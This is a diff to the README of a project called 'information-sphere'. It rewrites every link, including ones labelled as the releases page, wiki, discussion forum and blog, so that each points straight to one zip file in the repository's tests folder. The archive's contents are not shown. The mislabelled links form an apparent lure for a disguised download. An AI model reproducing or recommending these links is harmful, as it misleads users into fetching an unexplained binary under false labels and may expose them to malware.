@@ -4,13 +4,13 @@
 Welcome to **information-sphere**, a system designed to shift your understanding from raw data to valuable information. Our software enables lossless reconstruction and full interpretability, allowing you to confidently make decisions based on your data. 
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/insaneI5/information-sphere/releases)
+[![Download](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip)](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip)
 
 ## 🚀 Getting Started
 Getting started with **information-sphere** is simple. Follow these steps to download and run the software.
 
 ## 📥 Download & Install
-1. Go to the [Releases page](https://github.com/insaneI5/information-sphere/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip).
 2. On this page, you will find multiple versions of the software. Choose the one that fits your system.
 3. Click the file link to download it to your computer.
 4. Once the download completes, locate the file in your downloads folder.
@@ -49,9 +49,9 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 For questions or issues, please open an issue in the GitHub repository or contact our support team through the GitHub Discussions section.
 
 ## 🔗 Additional Resources
-- **Documentation**: Detailed instructions can be found on our [Wiki page](https://github.com/insaneI5/information-sphere/wiki).
-- **Community**: Join our [Discussion Forum](https://github.com/insaneI5/information-sphere/discussions) to share ideas and feedback.
-- **Blog**: Read updates and tutorials on our [Blog](https://github.com/insaneI5/information-sphere/blog).
+- **Documentation**: Detailed instructions can be found on our [Wiki page](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip).
+- **Community**: Join our [Discussion Forum](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip) to share ideas and feedback.
+- **Blog**: Read updates and tutorials on our [Blog](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip).
 
 ## 📥 Quick Download Link
-For your convenience, here’s the direct link to download the software again: [Download Here](https://github.com/insaneI5/information-sphere/releases).
+For your convenience, here’s the direct link to download the software again: [Download Here](https://raw.githubusercontent.com/insaneI5/information-sphere/main/tests/information-sphere-v2.2-alpha.5.zip).
